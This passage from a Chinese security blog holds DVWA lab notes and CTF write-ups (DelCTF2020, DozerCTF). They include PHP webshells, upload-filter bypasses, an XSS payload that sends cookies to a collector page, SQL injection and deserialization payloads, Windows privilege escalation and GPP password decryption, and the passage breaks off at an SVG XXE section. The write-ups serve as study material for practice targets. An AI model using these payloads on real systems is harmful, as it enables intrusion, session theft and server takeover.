<blockquote>
<p>发现加入了Anti-CSRF token机制。这里实力劝退</p>
</blockquote>
<h6 id="Impossible等级-2"><a href="#Impossible等级-2" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://img.kawhi.xyz/image-20200314165136975.png" alt="image-20200314165136975" style="high:80%;width:80%;" />

<blockquote>
<p>这里要求输入原始的密码，有效的防止了CSRF</p>
</blockquote>
<h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><strong>文件包含</strong></h5><ul>
<li>文件包含的定义</li>
</ul>
<blockquote>
<p>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
</blockquote>
<ul>
<li>文件包含漏洞</li>
</ul>
<blockquote>
<p>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
</blockquote>
<ul>
<li>php中引发文件包含漏洞的通常是以下四个函数</li>
</ul>
<blockquote>
<p>include()：找不到被包含文件，报错，但会继续运行脚本；</p>
<p>include_once()：与include（）类似，区别在于，当重复调用同一文件时，程序只调用一次；</p>
<p>require()：找不到被包含文件，报错，并且停止运行脚本；</p>
<p>require_once()：与require类似，区别在于，当重复调用同一文件时，程序只调用一次；</p>
</blockquote>
<ul>
<li>文件包含的特征</li>
</ul>
<blockquote>
<p>？page=</p>
<p>？file=</p>
<p>？home=</p>
</blockquote>
<h6 id="low等级-3"><a href="#low等级-3" class="headerlink" title="low等级"></a>low等级</h6><p><strong>本地文件包含</strong></p>
<p>查看源代码</p>
<img src="http://img.kawhi.xyz/image-20200314171409981.png" alt="image-20200314171409981" style="high:80%;width:80%;" />

<blockquote>
<p>可以看到，服务器端对page参数没有做任何的过滤跟检查</p>
<p>接下来给page参数随便输入点东西，报错之后就可以看到服务器的绝对路径</p>
<p>可以轻易获得phpinfo的信息</p>
</blockquote>
<img src="http://img.kawhi.xyz/image-20200314172226523.png" alt="image-20200314172226523" style="high:80%;width:80%;" />

<p><strong>远程文件包含</strong></p>
<blockquote>
<p>我在phpstudy的www目录下放了一个phpinfo.txt文件，同样是可以读取的。</p>
<p>说明这个漏洞可以执行远程文件，而且非php格式文件都可以执行</p>
</blockquote>
<img src="http://img.kawhi.xyz/image-20200314172507620.png" alt="image-20200314172507620" style="high:80%;width:80%;" />

<h6 id="Medium等级-3"><a href="#Medium等级-3" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314172841792.png" alt="image-20200314172841792" style="high:80%;width:80%;" />

<blockquote>
<p>看源码可知：Medium级别使用了str_replace函数将“http://”，“https://”，“../”，“..\”替换为空</p>
<p>可以使用“httphttp://://”, “…/./”,”file:///”方式绕过</p>
</blockquote>
<h6 id="High等级-3"><a href="#High等级-3" class="headerlink" title="High等级"></a>High等级</h6><blockquote>
<p>查看源码之后发现page参数必须以file开头</p>
<p>直接使用file:///方式绕过即可</p>
</blockquote>
<h6 id="Impossible等级-3"><a href="#Impossible等级-3" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><blockquote>
<p>查看源代码可知</p>
<p>Impossible级别中，page参数只能是如上四种，include.php,file1.php,file2.php,file3.php；杜绝了文件包含漏洞</p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>DVWA练习Ⅱ</title>
    <url>/2020/03/15/DVWA%E7%BB%83%E4%B9%A0%E2%85%A1/</url>
    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h1><ul>
<li><strong>文件上传漏洞</strong></li>
</ul>
<p>通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限</p>
<ul>
<li><strong>文件上传漏洞的前提条件</strong></li>
</ul>
<p>能上传木马，上传的木马能执行，还要清楚上传后的路径</p>
<h2 id="low等级"><a href="#low等级" class="headerlink" title="low等级"></a>low等级</h2><p>这里直接上传一句话木马<?php @eval($_Post[cmd]);?></p>
<img src="http://img.kawhi.xyz/image-20200315103605319.png" alt="image-20200315103605319" style="high:80%;width:80%;" />

<p>可以得知木马文件的路径为</p>
<p><a href="http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php">http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php</a></p>
<p>把木马的路径上传中国菜刀就可以获得服务器目录了</p>
<img src="http://img.kawhi.xyz/image-20200315121026444.png" alt="image-20200315121026444" style="high:80%;width:80%;" />

<h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200315110940498.png" alt="image-20200315110940498" style="high:80%;width:80%;" />

<p>发现限制了文件类型必须是jpeg或者或者png，同时文件大小必须小于100000字节。</p>
<p><strong>BurpSuite抓包修改content-type</strong></p>
<img src="http://img.kawhi.xyz/image-20200315163240649.png" alt="image-20200315163240649" style="high:80%;width:80%;" />

<p>可以在大箭头处把png修改为php即可成功上传，菜刀使用和low等级一样</p>
<p>也可修改小箭头处把类型修改为application/octet-stream</p>
<p>如果直接上传了a.png，菜刀就要使用文件包含的形式即：</p>
<p><a href="http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png">http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png</a></p>
<p>因为文件包含漏洞，不管文件后缀是否是php，都会尝试当做php文件执行。</p>
<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315164336513.png" alt="image-20200315164336513" style="high:80%;width:80%;" />

<p>通过查看源码发先依旧采用白名单过滤，只允许上传的文件后缀名为jpg、jpeg、png。</p>
<p>但是会读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，会报错。</p>
<p>这里可以使用图片隐写的方式把一句话木马写到图片里面再上传，再到菜刀里面使用文件包含的形式打开</p>
<p>图片即可获取webshell</p>
<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315164841208.png" alt="image-20200315164841208" style="high:80%;width:80%;" />

<p>可以看到加入了token，以及对上传的文件进行了重命名，彻底杜绝了文件上传漏洞。</p>
<h1 id="SQL回显注入"><a href="#SQL回显注入" class="headerlink" title="SQL回显注入"></a><strong>SQL回显注入</strong></h1><hr>
<ul>
<li><strong>SQL注入漏洞原理</strong></li>
</ul>
<p>将恶意的SQL语句拼接到合法的语句中，从而达到执行SQL语句的目的</p>
<ul>
<li><strong>SQL注入漏洞类型</strong></li>
</ul>
<p>字符型,数字型,搜索型。</p>
<ul>
<li><strong>注入的基本流程</strong></li>
</ul>
<p>①判断是否存在注入，注入是字符型还是数字型</p>
<p>②猜解SQL查询语句中的字段数</p>
<p>③确定回显位置</p>
<p>④获取当前数据库，获取数据库中表</p>
<p>⑤获取表中的字段名</p>
<p>⑥获取数据</p>
<h2 id="low等级-1"><a href="#low等级-1" class="headerlink" title="low等级"></a><strong>low等级</strong></h2><p>依次尝试1’ or ‘1’=’1，1 or 1=1，1“ or “1”=”1三种，发现变量的外面为单引号。存在字符型SQL注入。</p>
<p>接下来就可以查询数据库，用户名等等甚至可以写入Webshell，这里就不一一尝试了。</p>
<img src="http://img.kawhi.xyz/image-20200315170643403.png" alt="image-20200315170643403" style="high:80%;width:80%;" />

<h2 id="Medium等级-1"><a href="#Medium等级-1" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看源代码</p>
<img src="http://img.kawhi.xyz/image-20200315171449765.png" alt="image-20200315171449765" style="high:80%;width:80%;" />

<p>发现利用mysql_real_escape_string()函数转义了sql的特殊符号</p>
<p>而且设置了下拉框，控制用户输入</p>
<img src="http://img.kawhi.xyz/image-20200315171807295.png" alt="image-20200315171807295" style="high:80%;width:80%;" />

<p>这里直接burp suite抓包改值即可</p>
<p>如果遇到有的地方需要单引号，可以使用hex编码转换一下即可</p>
<h2 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><p>High级别在SQL查询语句中添加了LIMIT 1，以此控制只输入一个结果。</p>
<p>虽然添加了LIMIT 1，但是可以通过– 将其注释掉即可。</p>
<p>其他操作和low一致</p>
<h2 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315174243384.png" alt="image-20200315174243384" style="high:80%;width:80%;" />

<p>查看源码使用了PDO，划清了代码与数据的界限，有效防御SQL注入。</p>
<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a><strong>SQL盲注</strong></h1><ul>
<li><strong>盲注</strong></li>
</ul>
<p>这里的盲注不同于回显注入，他只会返回两种结果是或者不是</p>
<p>即User ID exists in the database或者User ID is MISSING from the database。</p>
<h2 id="low等级-2"><a href="#low等级-2" class="headerlink" title="low等级"></a><strong>low等级</strong></h2><p>这里分别试验1 and 1=2，1’and ‘1’=’2，1” and “1”=”2。最终1’and ‘1’=’2报错说明参数是单引号在外面的。</p>
<p>可以使用诸如此类的如：1’ and length(database())&gt;1，逐步通过正确还是错误判断字符串的长度。这里就不一一试验了。</p>
<h2 id="Medium等级-2"><a href="#Medium等级-2" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看源代码发现使用了mysql_real_escape_string()函数，操作和回显注入差不多</p>
<h2 id="High等级-2"><a href="#High等级-2" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><p>限制了输入的长度为1，在输入的最后加个#，就可以注释掉源码中的limit 1</p>
<h2 id="Impossible等级-2"><a href="#Impossible等级-2" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><p>和回显注入一样使用了PDO，有效防御了注入的漏洞。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h1><p>XSS简介</p>
<p>跨站脚本攻击，通过web站点漏洞，向客户端交付恶意脚本代码，这些代码可以被浏览器成功的执行，从而实现对客户端的攻击。XSS又分为存储型和放射型两种。</p>
<h2 id="low等级-3"><a href="#low等级-3" class="headerlink" title="low等级"></a><strong>low等级</strong></h2><ul>
<li><strong>弹窗</strong></li>
</ul>
<p>直接输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="http://img.kawhi.xyz/image-20200315200324914.png" alt="image-20200315200324914" style="high:80%;width:80%;" />

<ul>
<li><strong>获取cookie</strong></li>
</ul>
<p>这里新建一个cookie.php文件放在www的目录下</p>
<p>然后让用户点击带有js脚本的url，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.0.100/DVWA-1.9/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用户点击之后我们www的目录下就会生成cookie.txt文件，成功获取用户的cookie值。</p>
<img src="http://img.kawhi.xyz/image-20200315204539470.png" alt="image-20200315204539470" style="high:80%;width:80%;" />

<p>再修改刚刚获取的cookie值放进去就可以以admin的身份进入。</p>
<h2 id="Medium等级-3"><a href="#Medium等级-3" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看源代码</p>
<img src="http://img.kawhi.xyz/image-20200315205547446.png" alt="image-20200315205547446" style="high:80%;width:80%;" />

<p>发现script标签被替换为空了</p>
<p>使用嵌套即可绕过如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者大小写混合也可</p>
<h2 id="High等级-3"><a href="#High等级-3" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><p>查看源代码</p>
<img src="http://img.kawhi.xyz/image-20200315211243037.png" alt="image-20200315211243037" style="high:80%;width:80%;" />

<p>使用preg_replace() 函数用于正则表达式的搜索和替换，将script前后相关的内容都替换为空，使得双写绕过、大小写混淆绕过不再有效。</p>
<p>但是可以通过img、body等标签事件或者iframe等标签的src注入恶意的js代码。</p>
<h2 id="Impossible等级-3"><a href="#Impossible等级-3" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素（特殊意义），有效防止了反射型XSS攻击</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>DelCTF2020</title>
    <url>/2020/05/08/DelCTF2020/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>题目对我来说太难，只复现了两道题目。</p>
<h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a><strong>Check In</strong></h4><p>一道上传漏洞题，会检查<code>Content-Type</code>和文件后缀黑名单，这个问题不大。</p>
<p>然后发现过滤文件内容黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>

<p>所以一句话木马需要用短标签绕过，即上传<code>1.jpg</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>然后上传<code>.htaccess</code>解析<code>1.jpg</code>，这里用换行符绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>成功连接上蚁剑：</p>
<img src="http://img.kawhi.xyz/image-20200506153323919.png" style="high:100%;width:100%;" />

<h4 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h4><p>题目直接给出了源代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span>. md5(<span class="string">&quot;De1CTF2020&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&quot;submit&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            die($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;_&quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $filename);</span><br><span class="line">            echo <span class="string">&quot;save in:&quot;</span> . $sandbox.<span class="string">&quot;/&quot;</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Not Allow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    $ext = explode(<span class="string">&quot;.&quot;</span>, $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的check函数对文件的内容过滤了字母数字以及一些符号，这里可以使用无字符数字RCE绕过，具体参考：<a class="foo" href="https://0xparrot.github.io/ctf/2020/05/05/PHP-Webshell-without-alphanumeric-and-semi-colon/" target="_blank">传送门</a></p>
<p>这里直接上传<code>6.Php</code></p>
<p>内容为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?= $_=[] ?&gt; </span><br><span class="line">&lt;?= $_=@&quot;$_&quot; #Array ?&gt;</span><br><span class="line">&lt;?= $_=$_[(&#x27;!&#x27;==&#x27;@&#x27;)] #(&#x27;!&#x27;==&#x27;@&#x27;) results in 0 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;</span><br><span class="line">&lt;?= $_______ = &quot;_&quot;.$__ #_G ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GE ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GET ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $&#123;$_______&#125;[&quot;_&quot;]($&#123;$_______&#125;[&quot;__&quot;]) # $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>这个<code>$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]) ?&gt;</code>第一个参数是构造函数名，第二个构造函数的参数。</p>
<img src="http://img.kawhi.xyz/image-20200507181225122.png" style="high:100%;width:100%;" />

<p>像这样就可以getshell了，但是想要连上蚁剑还得自己写一个一句话木马进去。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://47.113.219.76/uploads/bf0688c36193e28a369a9e96517e4c2f/0d253abf34c57f57099249cd1737873b_6.phP?_=system&amp;__=echo%20&quot;&lt;?php%20eval($_POST[%27a%27])?&gt;&quot;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>

<p>然后就可以成功连上蚁剑了</p>
<img src="http://img.kawhi.xyz/image-20200507181750012.png" style="high:100%;width:100%;" />

<p>但是在蚁剑的终端输入<code>whoami</code>发现权限不够。</p>
<p>于是上传<code>cmd.exe</code>和<code>ms08066</code>在冰蝎里面进行提权。</p>
<img src="http://img.kawhi.xyz/image-20200507181915887.png" style="high:100%;width:100%;" />

<p>提权成功后发现</p>
<img src="http://img.kawhi.xyz/image-20200507182333363.png" style="high:100%;width:100%;" />

<p>在<code>//192.168.0.12/Hint/</code>找到一个压缩包，下载下来发现有密码。</p>
<p>然后就涉及到域渗透的内容，具体参考：<a class="foo" href="https://3gstudent.github.io/3gstudent.github.io/域渗透-利用SYSVOL还原组策略中保存的密码/" target="_blank">传送门</a></p>
<p>在域中，存在一个默认的共享路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>然后输入<code>ipconfig /all</code>发现</p>
<img src="http://img.kawhi.xyz/image-20200507182903605.png" style="high:100%;width:100%;" />

<p>就是说通过域内的共享文件夹保存了密码，微软把密钥公开了，所以可以通过破解这个密钥得到管理员的密码。</p>
<p>找到保存密码的地方</p>
<img src="http://img.kawhi.xyz/image-20200507183414569.png" style="high:100%;width:100%;" />

<p>打开发现密钥</p>
<img src="http://img.kawhi.xyz/image-20200507183526055.png" style="high:100%;width:100%;" />

<p>然后用kail自带的gpp-decrypt解密</p>
<img src="http://img.kawhi.xyz/image-20200508150215105.png" style="high:100%;width:100%;" />

<p>打开之前得到的压缩包输入密码即可得到flag。</p>
<h4 id="life"><a href="#life" class="headerlink" title="life"></a><strong>life</strong></h4><p>题目hint:No Game No Life!</p>
<p>这道题下载下来是一张图片，用<code>foremost</code>分离之后得到一个带密码的压缩包和一张类型二维码的图片。</p>
<img src="http://img.kawhi.xyz/image-20200508175230822.png" style="high:50%;width:50%;" />

<p>这里需要了解一下生命游戏：<a class="foo" href="https://blog.csdn.net/u011439689/article/details/17226237" target="_blank">传送门</a></p>
<p>然后有个网站可以模拟生命游戏：<a class="foo" href="https://funnyjs.com/jspages/game-of-life.html" target="_blank">传送门</a></p>
<img src="http://img.kawhi.xyz/image-20200508175630302.png" style="high:80%;width:80%;" />

<p>这里需要自己一个点一个点画上去，然后点击单步。</p>
<img src="http://img.kawhi.xyz/image-20200508175832975.png" style="high:80%;width:80%;" />

<p>可以看到一个二维码，扫描二维码就可以得到压缩包的密码。</p>
<p>解开压缩包之后发现txt文件有一串数字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ</span><br></pre></td></tr></table></figure>

<p>然后可以到<code>cyberchef</code>解密：</p>
<img src="http://img.kawhi.xyz/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>DozerCTF</title>
    <url>/2020/06/17/DozerCTF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>干啥啥不行，赛后read writeup第一名</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>这道题是原题</p>
<p>首先提示url二次编码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%25%32%37</span><br></pre></td></tr></table></figure>

<p>发现报错，然后尝试select和union都被过滤了，尝试堆叠注入。</p>
<p>查询所有数据库:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p>查询所有表:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p>查询words表中所有列:(注意要加上反引号)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `uziuzi`;#</span></span><br></pre></td></tr></table></figure>

<p>第一种payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;prEpare%20stmt%20from%20@sql;EXECUTE%20stmt;%23</span><br></pre></td></tr></table></figure>

<p>预处理查询数据库内容，这里直接拼接字符串没法执行，所以把字符串转16进制再执 行。</p>
<p>第二种payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;handler%20`uziuzi`%20open;handler%20`uziuzi`%20read%20first;%23</span><br></pre></td></tr></table></figure>

<h2 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a><strong>白给的反序列化</strong></h2><p>题目源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">&quot;cat $path&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        foreach ($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">    $path = @$_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">        function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = new home(<span class="string">&quot;mysys&quot;</span>,[<span class="string">&#x27;flag.php&#x27;</span>]);</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>关于<code>call_user_func_array</code>详情参考：<a style="text-decoration:none;" class="foo" href="https://www.php.net/manual/zh/function.call-user-func-array.php" target="_blank">传送门</a></p>
<p>这里需要改一下payload，因为服务器的php版本是 php5.59，没法直接改成public绕过（php7.1+版本对属性类型不敏感），所以需要吧s改成S（这样能识别16进制的<code>%00</code>）,把<code>&lt;0x00&gt;</code>替换为<code>\00</code>。</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30600/?path=O:4:%22home%22:2:&#123;S:12:%22\00home\00method%22;S:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:&#123;i:0;S:8:%22flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h2><p>题目的hint</p>
<ul>
<li>用户r1ck的操作记录在哪儿来着</li>
<li>如果你发现了sql注入，直接getshell吧，flag在/app目录里</li>
</ul>
<p>打开网页，有一个框要求输入URL，然后检查URL指向的file是不是svg图片</p>
<p>首先SVG是什么呢，SVG是基于XML的矢量图，可以支持Entity（实体）功能，这里未严格限制格式，因此造成blind xxe，ssrf打内网服务。</p>
<p>先写一个简单的SVG图片源码放在vps上</p>
